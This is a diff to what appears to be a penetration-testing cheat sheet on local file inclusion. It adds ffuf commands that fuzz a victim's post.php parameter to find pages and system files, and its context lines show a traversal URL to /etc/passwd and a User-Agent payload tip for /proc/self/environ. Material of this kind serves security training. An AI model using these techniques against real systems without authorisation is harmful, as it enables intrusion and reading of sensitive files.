@@ -8,6 +8,32 @@
 
 {% embed url="https://github.com/RoqueNight/LFI---RCE-Cheat-Sheet" %}
 
+##
+
+## &#x20;Find other php pages
+
+**Kali**
+
+```
+ffuf -c -u http://$VICTIM/post.php?post=FUZZ -w SecLists/Discovery/Web-Content/SVNDigger/cat/Language/php.txt > results.txt
+cat results.txt | grep -v 2422
+```
+
+
+
+## Find system level files
+
+Can use the list below to fill mylist.txt
+
+**Kali**
+
+```
+ffuf -c -u http://$VICTIM/post.php?post=FUZZ -w mylist.txt > results.txt
+cat results.txt | grep -v 2422
+```
+
+
+
 ## Places to look if LFI is possible
 
 | Location                    | Description                                                                                                                                                       |
@@ -346,5 +372,5 @@ http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
 
 Like a log file, send the payload in the User-Agent, it will be reflected inside the /proc/self/environ file
 
-<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
